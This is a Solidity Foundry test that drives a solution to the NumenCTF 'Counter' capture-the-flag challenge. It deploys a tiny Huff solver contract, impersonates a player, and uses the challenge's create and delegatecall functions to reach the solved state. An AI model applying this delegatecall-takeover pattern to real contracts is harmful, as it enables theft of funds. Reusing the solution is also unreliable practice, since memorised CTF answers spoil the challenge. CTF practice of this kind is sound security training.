// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.15;

import "foundry-huff/HuffDeployer.sol";
import "forge-std/Test.sol";
import "./challenge/Counter.sol";

contract ExploitTest is Test {
    function test() public {
        Solver solver = Solver(HuffDeployer.deploy("NumenCTF/Counter/Solver"));
        require(address(solver).code.length <= 24);

        address playerAddress = makeAddr("player");
        SmartCounter counter = new SmartCounter(address(this));
        vm.deal(playerAddress, 1 ether);

        vm.startPrank(playerAddress, playerAddress);
        counter.create(address(solver).code);
        counter.A_delegateccall("");
        vm.stopPrank();

        assertTrue(counter.isSolved(), "Invalid Instance");
    }
}

interface Solver {
    function blockNumber() external returns (uint32);
}
